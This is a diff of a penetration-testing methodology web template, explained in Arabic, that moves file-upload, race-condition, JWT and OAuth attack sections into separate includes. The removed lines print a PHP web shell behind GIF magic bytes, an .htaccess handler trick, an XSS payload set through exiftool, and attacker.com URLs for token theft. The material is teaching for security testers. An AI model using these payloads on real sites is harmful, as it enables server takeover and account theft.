@@ -570,6 +570,9 @@
           <div class="meth-item" id="meth-ef-websocket_sec" onclick="openMethPhase('websocket_sec')" data-search="websocket hacking cswsh xss sqli cross site web socket hijacking">
             <span>├── 🔌</span> <span>WebSocket Hacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'websocket_sec', '🔌 WebSocket Hacking')">★</button>
           </div>
+          <div class="meth-item" id="meth-ef-deserialization" onclick="openMethPhase('deserialization')" data-search="insecure deserialization java php python pickle ysoserial phpggc RCE gadget chain">
+            <span>├── ☣️</span> <span>Insecure Deserialization</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'deserialization', '☣️ Insecure Deserialization')">★</button>
+          </div>
           <div class="meth-item" id="meth-ef-p15" onclick="openMethPhase('p15')" data-search="cloud security aws s3 bucket iam privilege escalation">
             <span>└── ☁️</span> <span>Cloud Security</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p15', '☁️ Cloud Security')">★</button>
           </div>
@@ -1993,245 +1996,19 @@ aws s3 ls</div>
       </div>
 
       <!-- Phase 11: File Upload Exploits -->
-      <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
-
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📁</span> File Upload Exploits - Deep Dive</h2>
-          <p class="hero-tagline">منهجية تخطي فلاتر الرفع، تزوير امتدادات الملفات، والوصول إلى Remote Code Execution (RCE)</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. فهم فلاتر رفع الملفات وكيفية تخطيها</h3></div>
-          <p>يعتمد السيرفر عادة على عدة فلاتر للتحقق من الملف المرفوع. يجب عليك اختبارها واحدة تلو الأخرى لاكتشاف نقطة الضعف:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Client-Side Filters:</strong> يتم الفحص بواسطة الجافاسكريبت في المتصفح. يمكن تخطيها بسهولة باعتراض الطلب عبر Burp Suite وتغيير الملف قبل وصوله للسيرفر.</li>
-            <li>✔ <strong>Content-Type Spoofing:</strong> السيرفر يفحص ترويسة <code>Content-Type</code> في الطلب. قم بتغييرها من <code>application/x-php</code> إلى <code>image/jpeg</code> لتمرير الملف.</li>
-            <li>✔ <strong>Extension Blacklisting Bypass:</strong> إذا كان السيرفر يمنع <code>.php</code>، جرب امتدادات بديلة ينفذها السيرفر: <code>.php3, .php4, .php5, .phtml, .phar</code> أو <code>.jspx, .jspf</code> في الجافا، أو <code>.ashx, .asmx</code> في الـ .NET.</li>
-          </ul>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. حيل التخطي المتقدمة (Advanced Bypasses)</h3></div>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>التقنية (Technique)</th>
-                <th>شرح الاستغلال (How it works)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>Double Extensions</strong></td>
-                <td>رفع الملف باسم <code>shell.php.jpg</code> أو <code>shell.jpg.php</code>. يعتمد على خطأ في إعدادات السيرفر (مثل Apache AddHandler) حيث يقرأ السيرفر أول امتداد ويتجاهل الثاني، أو العكس.</td>
-              </tr>
-              <tr>
-                <td><strong>Null Byte Injection</strong></td>
-                <td>استخدام بايت فارغ لقطع السلسلة النصية: <code>shell.php%00.jpg</code>. فلاتر اللغة تعتبره صورة، بينما نظام التشغيل يقطع الاسم عند البايت الفارغ ويحفظه كـ <code>shell.php</code> (فعال في إصدارات PHP القديمة).</td>
-              </tr>
-              <tr>
-                <td><strong>Magic Bytes (File Signatures)</strong></td>
-                <td>السيرفر يفحص أول بايتات من الملف للتأكد من نوعه. أضف بايتات الصورة الوهمية في بداية كود الـ PHP الخاص بك: <br><code>GIF89a;<br>&lt;?php system($_GET['cmd']); ?&gt;</code></td>
-              </tr>
-              <tr>
-                <td><strong>Overwriting Config Files</strong></td>
-                <td>رفع ملف <code>.htaccess</code> خبيث (في Apache) لتوجيه السيرفر لتنفيذ ملفات الصور كأنها PHP: <br><code>AddType application/x-httpd-php .jpg</code><br>ثم ارفع الـ Web Shell باسم <code>shell.jpg</code> وسيعمل بنجاح.</td>
-              </tr>
-            </tbody>
-          </table></div>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🖼️</span> 3. استغلال ثغرات مكتبات الصور (Image Processing Vulns)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>ImageTragick (CVE-2016-3714):</strong> إذا كان الموقع يستخدم ImageMagick لتعديل الصور، ارفع ملف صورة يحتوي على كود استغلال لتشغيل أوامر نظامية أثناء معالجة الصورة.</li>
-            <li><strong>ExifTool/Metadata:</strong> حقن بايلود XSS أو Command Injection في بيانات وصف الصورة (Exif Data) مثل <code>exiftool -Comment='&lt;script&gt;alert(1)&lt;/script&gt;' image.jpg</code>، وعندما يعرض الموقع هذه البيانات، يتم تنفيذ البايلود.</li>
-            <li><strong>Polyglot Files:</strong> إنشاء ملف صالح كصورة وصالح كسكربت جافاسكريبت/PHP في نفس الوقت لتجاوز أدق فلاتر معالجة الصور المتقدمة.</li>
-          </ul>
-        </div>
-    
-
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p12')">
-          ✅ Mark Phase Complete — File Upload Exploits Done → Proceed to Race Conditions
-        </button>
-</div>
+{% include 'main/modules/file_upload_bypass.html' %}
       </div>
 
       <!-- Phase 12: Race Conditions -->
-      <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;">
-
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚡</span> Race Conditions - Deep Dive</h2>
-          <p class="hero-tagline">منهجية التلاعب بالزمن المتزامن، هجمات الـ Single-Packet، وتخطي حدود العمليات المسموحة</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. فهم ثغرات حالة السباق (Concurrency Flaws)</h3></div>
-          <p>تحدث هذه الثغرة عندما يقوم السيرفر بمعالجة عدة طلبات متزامنة (Concurrent Requests) تتشارك نفس الموارد (כقاعدة البيانات أو رصيد الحساب) دون عمل "إقفال" (Locking) صحيح للمتغيرات. نتيجة لذلك، تتداخل المعاملات.</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Limit Overrun:</strong> تجاوز الحد المسموح. (مثال: استخدام كوبون خصم واحد 50 مرة في نفس اللحظة للحصول على خصم ضخم).</li>
-            <li>✔ <strong>Time-of-check to time-of-use (TOCTOU):</strong> السيرفر يتحقق من الرصيد (الخطوة 1)، وقبل أن يخصم الرصيد (الخطوة 2)، يتلقى طلباً آخر وراءه مباشرة. ينجح كلا الطلبين برصيد لا يكفي إلا لطلب واحد!</li>
-          </ul>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ 2. تقنية الـ Single-Packet Attack (المزامنة القصوى)</h3></div>
-          <p>في الماضي كنا نستخدم Burp Intruder وعدد كبير من الـ Threads. لكن المشكلة أن زمن انتقال الشبكة (Network Latency) كان يفسد التزامن. الآن نستخدم <strong>HTTP/2 Single-Packet Attack</strong>:</p>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الفرق</th>
-                <th>Traditional Attack (Intruder)</th>
-                <th>Single-Packet Attack (HTTP/2)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>آلية الإرسال</strong></td>
-                <td>يتم إرسال كل طلب في TCP Packet منفصلة، مما يسبب تأخير بأجزاء من الثانية بين كل طلب.</td>
-                <td>في بروتوكول HTTP/2، يمكن تجميع 20-30 طلباً معاً، وإرسال جميع الطلبات <strong>في حزمة شبكة واحدة (TCP Packet)</strong> لتصل السيرفر في اللحظة ذاتها بالمايكرو ثانية.</td>
-              </tr>
-              <tr>
-                <td><strong>نسبة النجاح</strong></td>
-                <td>ضعيفة جداً، وتعتمد على صدفة التوقيت وسرعة الاتصال.</td>
-                <td>شبه مؤكدة (100% Synchronization) لتخطي أدق آليات الحماية.</td>
-              </tr>
-              <tr>
-                <td><strong>الأداة المفضلة</strong></td>
-                <td>Turbo Intruder القديم.</td>
-                <td>Burp Suite Repeater (Send Group in Parallel) المدمجة حديثاً.</td>
-              </tr>
-            </tbody>
-          </table></div>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🔄</span> 3. سيناريوهات استغلال معقدة (Multi-Endpoint Race Conditions)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>تفعيل الحساب قبل الدفع (Bypassing Payment Flow):</strong> <br>طلب (أ): شراء منتج (معلق بانتظار الدفع).<br>طلب (ب): إلغاء الطلب المتبوع باسترداد المبلغ.<br>سباق الطلبين قد يؤدي لاسترداد مبلغ لم تقم بدفعه أساساً بسبب تداخل العمليات.</li>
-            <li><strong>تخطي توثيق الـ 2FA (Multi-Step Bypass):</strong><br>طلب (أ): طلب رمز 2FA جديد.<br>طلب (ب): التحقق برمز قديم قبل أن يتم إبطاله من قاعدة البيانات.</li>
-          </ul>
-        </div>
-    
-
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p12" onclick="markPhaseComplete('p12','p14')">
-          ✅ Mark Phase Complete — Race Conditions Done → Proceed to JWT Hacking
-        </button>
-</div>
+{% include 'main/modules/race_conditions.html' %}
       </div>
 
       <!-- Phase 14: JWT Hacking -->
-      <div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #d946ef;">
-
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎫</span> JSON Web Tokens (JWT) - Deep Dive</h2>
-          <p class="hero-tagline">منهجية تزوير التوقيعات، كسر التشفير، واستغلال ترويسات الـ JWK و JKU لتخطي التوثيق</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. أساسيات الـ JWT وأخطاء التكوين (Core Configuration Flaws)</h3></div>
-          <p>يتكون الـ JWT من 3 أجزاء (Header.Payload.Signature). يعتمد أمانه كلياً على التوقيع الرقمي لمنع التلاعب. إذا قمت بتغيير <code>"role":"user"</code> إلى <code>"admin"</code> سيصبح التوقيع غير صالح. لكن يمكن تخطيه عبر:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>The "None" Algorithm Attack:</strong> قم بتغيير الخوارزمية في الترويسة من <code>"alg":"HS256"</code> إلى <code>"alg":"none"</code> (أو None, NONE). احذف التوقيع تماماً من آخر التوكن. بعض مكتبات السيرفر ستقبل التوكن وتعتبره موثقاً.</li>
-            <li>✔ <strong>Algorithm Confusion (RS256 to HS256):</strong> إذا كان السيرفر يستخدم مفتاح عام/خاص (RS256)، قم بتغيير الخوارزمية إلى HS256 (مفتاح متماثل). ثم قم بتوقيع التوكن الخاص بك باستخدام <strong>المفتاح العام</strong> للسيرفر كسرّ (Secret Key). السيرفر الذي لا يتحقق من نوع الخوارزمية بشكل صحيح سيقبل التوكن.</li>
-            <li>✔ <strong>Weak Secret Cracking:</strong> استخدم أدوات مثل <code>hashcat</code> لكسر سر الـ HS256 إذا كان ضعيفاً. <br><code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code></li>
-          </ul>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. حقن الترويسات وتزوير المفاتيح (Advanced Header Injections)</h3></div>
-          <p>بدلاً من محاولة استخراج المفتاح، ماذا لو أجبرت السيرفر على استخدام مفتاحك الخاص للتحقق من توقيعك؟</p>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الثغرة (Vulnerability)</th>
-                <th>آلية الاستغلال (Exploitation)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>JWK Header Injection</strong></td>
-                <td>الترويسة (Header) قد تحتوي على مفتاح <code>"jwk"</code> مضمّن بداخلها. قم بتوليد مفتاح RSA خاص بك، أدخل الجزء العام منه في ترويسة الـ JWK، ووقّع التوكن بالمفتاح الخاص بك. بعض السيرفرات الضعيفة ستستخدم الـ JWK المرفق للتحقق!</td>
-              </tr>
-              <tr>
-                <td><strong>JKU Parameter Abuse (SSRF)</strong></td>
-                <td>الترويسة تحتوي على <code>"jku": "https://server.com/keys.json"</code> (رابط يجلب المفاتيح). استبدلها برابط خادمك الخاص <code>"jku": "https://attacker.com/keys.json"</code>. السيرفر سيستدعي ملفك ويتحقق من التوكن بنجاح.</td>
-              </tr>
-              <tr>
-                <td><strong>KID Directory Traversal</strong></td>
-                <td>معامل <code>"kid"</code> يشير إلى اسم ملف المفتاح. يمكن استغلاله عبر حقن Directory Traversal <code>"kid": "../../../dev/null"</code> للتحقق ضد ملف فارغ، أو حقن أوامر SQL إذا كان يُقرأ من قاعدة بيانات.</td>
-              </tr>
-            </tbody>
-          </table></div>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🛠️</span> 3. أدوات التحليل (Essential Tools)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>Burp Suite JWT Editor:</strong> إضافة أساسية في سويت لفك، تعديل، وتوقيع الـ JWTs، وتجربة هجمات الـ None والـ Algorithm Confusion بكبسة زر.</li>
-            <li><strong>jwt_tool:</strong> أداة بايثون سطر أوامر قوية لعمل Fuzzing آلي لكل الثغرات المعروفة في مسار الـ JWT.</li>
-          </ul>
-        </div>
-    
-
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p14" onclick="markPhaseComplete('p14','p13')">
-          ✅ Mark Phase Complete — JWT Hacking Done → Proceed to OAuth & Sessions
-        </button>
-</div>
+{% include 'main/modules/jwt_attacks.html' %}
       </div>
 
       <!-- Phase 13: OAuth & Sessions -->
-      <div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #8b5cf6;">
-
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔓</span> OAuth 2.0 & Session Management - Deep Dive</h2>
-          <p class="hero-tagline">منهجية السيطرة على الحسابات (Account Takeover) عبر التلاعب بآليات المصادقة وتدفق الـ OAuth.</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. ثغرات الـ OAuth الأساسية (OAuth Misconfigurations)</h3></div>
-          <p>الـ OAuth عملية معقدة تعتمد على إعادة التوجيه (Redirects). أبسط خطأ في التحقق يؤدي لتسريب رموز الدخول (Access Tokens).</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>تسريب الرمز عبر Redirect URI:</strong> إذا كان معامل <code>redirect_uri</code> غير مقيّد بشكل صارم (Strict Whitelist)، يمكنك استغلال ثغرة Open Redirect لسرقة الكود الخاص بالضحية وتحويله لسيرفرك: <code>redirect_uri=https://site.com/login?redirect=https://attacker.com</code></li>
-            <li>✔ <strong>OAuth CSRF (غياب معامل State):</strong> إذا لم يرسل التطبيق معامل <code>state</code> عشوائي للتحقق منه عند عودة الطلب، يمكنك إرسال رابط التفويض الخاص بك (المربوط بحسابك المهاجم) للضحية. بمجرد نقره، سيتم ربط حسابه الاجتماعي בחسابك أنت في الموقع!</li>
-            <li>✔ <strong>تسريب التوكن عبر الـ Referer:</strong> في تدفق (Implicit Flow)، يظهر الـ Token في مسار الـ URL (كـ Hash Fragment). إذا احتوت الصفحة الموجه لها على روابط خارجية أو صور، قد يتسرب الـ Token في ترويسة <code>Referer</code> لتلك الروابط الخارجية.</li>
-          </ul>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. ثغرات إدارة الجلسات (Session Management)</h3></div>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الثغرة (Vulnerability)</th>
-                <th>كيفية الفحص والاستغلال (Testing & Exploitation)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>Session Fixation (تثبيت الجلسة)</strong></td>
-                <td>السيرفر لا يقوم بإصدار معرف جلسة جديد (New Session ID) بعد تسجيل الدخول بنجاح. المهاجم يعطي الضحية رابطاً يحتوي على معرف جلسة (معروف للمهاجم). عندما يسجل الضحية دخوله، تصبح الجلسة "المعروفة" مفعلة بصلاحيات الضحية.</td>
-              </tr>
-              <tr>
-                <td><strong>Session Expiration Flaws (عدم الانتهاء)</strong></td>
-                <td>احتفظ بكوكي مسجل الدخول، ثم قم بتسجيل الخروج من الواجهة. حاول استخدام الكوكي القديم للوصول للصفحات المحمية. إذا نجح الأمر، فهذا يعني أن زر تسجيل الخروج يحذف الكوكي من المتصفح فقط ولكنه لا ينهي الجلسة (Invalidate) فعلياً من السيرفر.</td>
-              </tr>
-              <tr>
-                <td><strong>Concurrent Login (تزامن الجلسات)</strong></td>
-                <td>إذا غير المستخدم كلمة مروره (Password Reset)، هل يتم تسجيل الخروج تلقائياً من جميع أجهزته الأخرى؟ إذا لم يحدث ذلك، يمكن لمخترق حصل على جلسة قديمة البقاء متصلاً للأبد.</td>
-              </tr>
-            </tbody>
-          </table></div>
-        </div>
-    
-
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p13" onclick="markPhaseComplete('p13','p15')">
-          ✅ Mark Phase Complete — OAuth & Sessions Done → Proceed to Cloud Security
-        </button>
-</div>
+{% include 'main/modules/oauth_attacks.html' %}
       </div>
 
       <!-- Phase 15: Cloud Security -->
@@ -3612,7 +3389,8 @@ nmap --mtu 24 &lt;Target_IP&gt; # Custom MTU size</code></pre>
       </div>
 {% include 'main/modules/mod_websocket_deep.html' %}
 {% include 'main/modules/mod_llm_security_deep.html' %}
-    </div> <!-- end meth-viewer -->
+    {% include 'main/modules/deserialization.html' %}
+</div> <!-- end meth-viewer -->
   </div> <!-- end methodology-app -->
 <!-- Popup Modal structure for alert testing -->
   <div class="popup-overlay" id="popupOverlay"></div>
